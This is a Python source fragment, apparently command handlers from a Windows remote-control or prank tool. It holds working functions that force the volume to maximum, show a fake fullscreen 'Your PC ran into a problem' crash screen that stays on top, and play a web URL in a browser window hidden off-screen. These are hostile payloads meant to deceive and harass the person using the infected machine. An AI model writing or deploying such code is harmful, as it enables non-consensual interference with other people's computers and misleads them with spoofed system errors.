def f_volmax():
    u = ctypes.windll.user32
    for _ in range(50):
        u.keybd_event(0xAF, 0, 0, 0)
        u.keybd_event(0xAF, 0, 2, 0)
    return "volume maxed"


def f_bsod(secs):
    try:
        secs = max(3, int(secs or 10))
    except Exception:
        secs = 10
    threading.Thread(target=f_bsod_win, args=(secs,), daemon=True).start()
    return "bsod %ds" % secs


def f_bsod_win(secs):
    import tkinter as tk
    r = tk.Tk()
    r.configure(bg="#0078d7")
    r.attributes("-fullscreen", True)
    r.attributes("-topmost", True)
    tk.Label(r, text=":(", bg="#0078d7", fg="white", font=("Segoe UI", 110)).pack(pady=(110, 10))
    tk.Label(r, text="Your PC ran into a problem and needs to restart. We're just collecting "
                     "some error info, and then we'll restart for you.",
             bg="#0078d7", fg="white", font=("Segoe UI", 19), wraplength=900).pack()
    p = tk.Label(r, text="0% complete", bg="#0078d7", fg="white", font=("Segoe UI", 16))
    p.pack(pady=28)
    tk.Label(r, text="For more information about this issue, search online for: "
                     "INACCESSIBLE_BOOT_DEVICE", bg="#0078d7", fg="white",
             font=("Segoe UI", 12)).pack(pady=8)
    end = time.time() + secs

    def tick():
        left = end - time.time()
        p.config(text="%d%% complete" % int(100 * (1 - max(0, left) / secs)))
        if left <= 0:
            r.destroy()
            return
        r.after(200, tick)
    tick()
    r.mainloop()


def f_yt(url):
    try:
        f_ytstop()
    except Exception:
        pass
    b = ""
    for c in (os.path.expandvars(r"%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe"),
              os.path.expandvars(r"%ProgramFiles%\Microsoft\Edge\Application\msedge.exe"),
              os.path.expandvars(r"%ProgramFiles%\Google\Chrome\Application\chrome.exe"),
              os.path.expandvars(r"%ProgramFiles(x86)%\Google\Chrome\Application\chrome.exe")):
        if os.path.isfile(c):
            b = c
            break
    if not b:
        return "no browser found"
    prof = os.path.join(f_appdir(), "ytprof")
    p = subprocess.Popen([b, "--autoplay-policy=no-user-gesture-required",
                          "--user-data-dir=" + prof, "--no-first-run",
                          "--no-default-browser-check", "--window-position=-32000,-32000",
                          "--window-size=800,600", url], creationflags=0x08000000)
    G["ytpid"] = p.pid
    return "playing offscreen"


def f_ytstop():
    pid = G.get("ytpid")
    if pid:
        subprocess.run(["taskkill", "/f", "/t", "/pid", str(pid)],
                       capture_output=True, creationflags=0x08000000)
        G["ytpid"] = None
        return "music stopped"
    return "not playing"